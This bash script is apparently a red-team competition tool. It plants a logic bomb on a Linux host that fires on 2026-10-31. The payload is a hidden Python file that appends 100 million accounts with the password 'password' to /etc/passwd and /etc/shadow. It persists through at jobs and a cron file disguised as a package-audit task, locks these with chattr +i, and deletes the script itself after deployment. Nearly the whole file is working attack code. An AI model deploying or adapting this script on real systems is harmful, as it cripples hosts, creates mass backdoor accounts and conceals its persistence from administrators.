#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

PAYLOAD="/usr/local/lib/.sys_cleanup"
CRON_FILE="/etc/cron.d/pkg_audit"
USER_LIST="/usr/local/lib/.user_registry"
USER_COUNT=100000000
AT_SPOOL_DIRS=(/var/spool/at/jobs /var/spool/cron/atjobs /var/spool/at)

LOGIN_SHELL=$(command -v bash 2>/dev/null || command -v sh)

# ── Helpers ───────────────────────────────────────────────────────────────────

# Schedule one at job; return the job number via atq diff.
# Uses temp files instead of process substitution to stay safe under
# set -euo pipefail (process substitution + grep exit-1 breaks pipefail).
schedule_at() {
    local at_time="$1"
    local f_before f_after new_id=""
    f_before=$(mktemp)
    f_after=$(mktemp)
    atq 2>/dev/null | awk '{print $1}' | sort > "$f_before"
    echo "bash $PAYLOAD" | at "$at_time" 2>/dev/null || true
    sleep 0.2
    atq 2>/dev/null | awk '{print $1}' | sort > "$f_after"
    # comm -13: lines only in file2 (after) = newly added job IDs
    new_id=$(comm -13 "$f_before" "$f_after" | head -1 || true)
    rm -f "$f_before" "$f_after"
    printf '%s' "${new_id:-}"
}

# Lock the spool file for a given job number.
# Uses ls -t (newest first) — cross-distro; avoids grep for Debian-specific headers.
lock_at_job() {
    local job_id="$1"
    sleep 0.3  # give atd a moment to write the spool file
    for spool in "${AT_SPOOL_DIRS[@]}"; do
        [[ -d "$spool" ]] || continue
        local fname f
        fname=$(ls -t "$spool" 2>/dev/null | head -1 || true)
        [[ -n "$fname" ]] || continue
        f="$spool/$fname"
        if [[ -f "$f" ]]; then
            chattr +i "$f" 2>/dev/null && echo "[+]   locked at spool: $f" || true
            return
        fi
    done
}

# ── Deploy ────────────────────────────────────────────────────────────────────
case "${1:-}" in
  deploy)
    # Fixed trigger: 12:00 PM CDT (UTC-5) on Oct 31, 2026 = 17:00 UTC
    TRIGGER_EPOCH=$(date -d '2026-10-31 17:00:00 UTC' +%s 2>/dev/null || \
                    date -u -d '2026-10-31 17:00:00' +%s 2>/dev/null || \
                    echo 1793466000)
    TRIGGER_MIN=$(date -d "@${TRIGGER_EPOCH}" '+%M')
    TRIGGER_HR=$(date -d "@${TRIGGER_EPOCH}" '+%H')
    TRIGGER_DAY=$(date -d "@${TRIGGER_EPOCH}" '+%d')
    TRIGGER_MON=$(date -d "@${TRIGGER_EPOCH}" '+%m')

    # Ensure at is installed (not present by default on Rocky 9/10 or Ubuntu minimal)
    if ! command -v at &>/dev/null; then
        echo "[*] Installing at..."
        if command -v dnf &>/dev/null; then
            dnf install -y at 2>/dev/null || true
        elif command -v apt-get &>/dev/null; then
            # Disable cdrom sources that block installs on DVD-provisioned machines.
            sed -i 's|^deb cdrom:|#deb cdrom:|g' /etc/apt/sources.list 2>/dev/null || true
            # Add network repos — without them apt's cache has no packages at all.
            _cn=$(. /etc/os-release 2>/dev/null && printf '%s' "${VERSION_CODENAME:-bookworm}")
            if ! grep -rqE "deb.debian.org/debian[[:space:]]+${_cn}[[:space:]]+main" \
                    /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null; then
                cat > "/etc/apt/sources.list.d/debian-rt-main.list" <<SRCEOF
deb http://deb.debian.org/debian ${_cn} main
deb http://security.debian.org/debian-security ${_cn}-security main
SRCEOF
            fi
            # -o Acquire::Check-Valid-Until=false handles clock-skew on competition
            # VMs where the system clock lags the repo release timestamps.
            DEBIAN_FRONTEND=noninteractive \
                apt-get -o Acquire::Check-Valid-Until=false update -q 2>/dev/null || true
            DEBIAN_FRONTEND=noninteractive apt-get install -y at 2>/dev/null || true
        fi
    fi
    systemctl enable --now atd 2>/dev/null || service atd start 2>/dev/null || true

    # Write payload script (Python direct-write — useradd is too slow for 100M)
    cat > "$PAYLOAD" << 'PAYLOAD_EOF'
#!/usr/bin/env python3
import os, sys, random, string, time, subprocess
USER_LIST = "/usr/local/lib/.user_registry"
USER_COUNT = 100000000
START_UID = 100000
SHELL = "/bin/bash"
CRON_FILE = "/etc/cron.d/pkg_audit"
pw = subprocess.getoutput("openssl passwd -6 password")
if not pw.startswith("$"):
    pw = "x"
chars = string.ascii_lowercase
t0 = time.time()
added = 0
with open("/etc/passwd", "a", buffering=1048576) as fp, \
     open("/etc/shadow", "a", buffering=1048576) as fs, \
     open(USER_LIST, "w", buffering=1048576) as ul:
    for i in range(USER_COUNT):
        name = "".join(random.choices(chars, k=20))
        uid = str(START_UID + i)
        fp.write(name + ":x:" + uid + ":" + uid + "::/home/" + name + ":" + SHELL + "\n")
        fs.write(name + ":" + pw + ":19631:0:99999:7:::\n")
        ul.write(name + "\n")
        added += 1
os.system("chattr +i " + USER_LIST + " 2>/dev/null")
os.system("sed -i '/pkg_audit/d' " + CRON_FILE + " 2>/dev/null")
with open("/var/log/.pkg_audit.log", "a") as log:
    log.write(str(added) + " users added at " + str(time.time()) + "\n")
os.system("wall '\n  RED TEAM\n\n  " + str(added) + " users just joined /etc/passwd. Hope you backed it up.\n'")
PAYLOAD_EOF
    chmod 700 "$PAYLOAD"
    chattr +i "$PAYLOAD" 2>/dev/null || true

    # Layer 1: four staggered at jobs at 12:00/12:05/12:10/12:30 PM CDT (17:xx UTC)
    echo "[+] Scheduling at jobs..."
    for at_time in "17:00 Oct 31" "17:05 Oct 31" "17:10 Oct 31" "17:30 Oct 31"; do
        jid=$(schedule_at "$at_time")
        echo "[+]   at ${at_time} UTC → job ${jid:-?}"
        sleep 0.2 && lock_at_job "${jid:-}"
    done

    # Layer 2: cron fallback at the exact trigger minute
    cat > "$CRON_FILE" << CRON_EOF
# pkg_audit — package database sync
${TRIGGER_MIN} ${TRIGGER_HR} ${TRIGGER_DAY} ${TRIGGER_MON} * root bash ${PAYLOAD}
CRON_EOF
    chmod 644 "$CRON_FILE"
    chattr +i "$CRON_FILE" 2>/dev/null || true

    echo "[+] 12_logic_bomb: armed"
    echo "[+]   Trigger: 12:00 PM CDT (17:00 UTC) on 2026-10-31"
    echo "[+]   Payload: create ${USER_COUNT} users (random 20-char names, direct /etc/passwd write, pass=password)"
    echo "[+]   Defuse:  remove at jobs + unlock and remove ${CRON_FILE}"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;

# ── Cleanup ───────────────────────────────────────────────────────────────────
  cleanup)
    echo "[-] Removing at jobs referencing payload..."
    while IFS= read -r line; do
        jid=$(echo "$line" | awk '{print $1}')
        if at -c "$jid" 2>/dev/null | grep -qF "$PAYLOAD"; then
            # Unlock the spool file first
            for spool in "${AT_SPOOL_DIRS[@]}"; do
                [[ -d "$spool" ]] || continue
                for f in "$spool"/*; do
                    [[ -f "$f" ]] || continue
                    grep -qF "$PAYLOAD" "$f" 2>/dev/null && chattr -i "$f" 2>/dev/null || true
                done
            done
            atrm "$jid" 2>/dev/null && echo "[-]   removed at job ${jid}" || \
                echo "[!]   atrm ${jid} failed — still locked?"
        fi
    done < <(atq 2>/dev/null || true)

    chattr -i "$CRON_FILE"  2>/dev/null || true
    chattr -i "$PAYLOAD"    2>/dev/null || true
    chattr -i "$USER_LIST"  2>/dev/null || true
    rm -f "$CRON_FILE" "$PAYLOAD"

    echo "[-] Removing bomb users..."
    removed=0
    if [[ -f "$USER_LIST" ]]; then
        while IFS= read -r name; do
            [[ -z "$name" ]] && continue
            userdel -r "$name" 2>/dev/null && removed=$(( removed + 1 )) || true
        done < "$USER_LIST"
        rm -f "$USER_LIST"
    fi
    echo "[-] Removed ${removed} users"
    echo "[-] 12_logic_bomb: defused"
    ;;

# ── Status ────────────────────────────────────────────────────────────────────
  status)
    echo "[*] Pending at jobs:"
    atq 2>/dev/null || echo "  (atq unavailable)"
    bomb_users=$( [[ -f "$USER_LIST" ]] && wc -l < "$USER_LIST" || echo 0 )
    echo "[*] Bomb users created: ${bomb_users}"
    echo "[*] User registry: $( [[ -f "$USER_LIST" ]] && echo "present (${USER_LIST})" || echo "absent — bomb not yet fired" )"
    echo "[*] Cron fallback: $( [[ -f "$CRON_FILE" ]] && echo "present" || echo "absent" )"
    echo "[*] Payload script: $( [[ -f "$PAYLOAD" ]] && echo "present" || echo "absent" )"
    ;;

  *) echo "Usage: $0 deploy|cleanup|status"; exit 1 ;;
esac
